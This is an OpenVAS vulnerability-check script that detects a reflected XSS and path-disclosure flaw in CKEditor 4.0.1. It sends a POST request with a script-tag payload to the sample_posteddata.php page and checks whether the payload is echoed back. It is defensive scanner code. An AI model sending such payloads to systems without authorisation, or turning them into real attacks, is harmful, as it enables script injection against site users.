###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ckeditor_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# CKEditor Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site and
  results in loss of confidentiality.
  Impact Level: Application";

tag_affected = "CKEditor Version 4.0.1";
tag_insight = "Input passed via POST parameters to /ckeditor/samples/sample_posteddata.php
  is not properly sanitized before being returned to the user.";
tag_solution = "Update to CKEditor Version 4.0.1.1 or later
  For updates refer to http://ckeditor.com/download";
tag_summary = "This host is installed with CKEditor and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(903302);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-02-26 18:00:48 +0530 (Tue, 26 Feb 2013)");
  script_name("CKEditor Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/90373");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24530");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120387");
  script_xref(name : "URL" , value : "http://ckeditor.com/release/CKEditor-4.0.1.1");

  script_description(desc);
  script_summary("Check if CKEditor is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible paths
foreach dir (make_list("", "/ckeditor", "/editor", cgi_dirs()))
{
  ## Application Confirmation
  if(http_vuln_check(port:port, url:dir + "/samples/index.html",
     pattern:"CKEditor", check_header:TRUE,
     extra_check:make_list('CKEditor instance', '>CKSource<')))
  {
    ## Construct attack request
    url = dir + '/samples/sample_posteddata.php';

    ##Construct post data
    postData = "<script>alert('XSS-Test')</script>[]=PATH DISCLOSURE";

    ##Construct the request string
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData);
    ## Send request and receive the response
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    ## Confirm exploit worked by checking the response
    if("<script>alert('XSS-Test')</script>" >< res && "ckeditor.com" >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
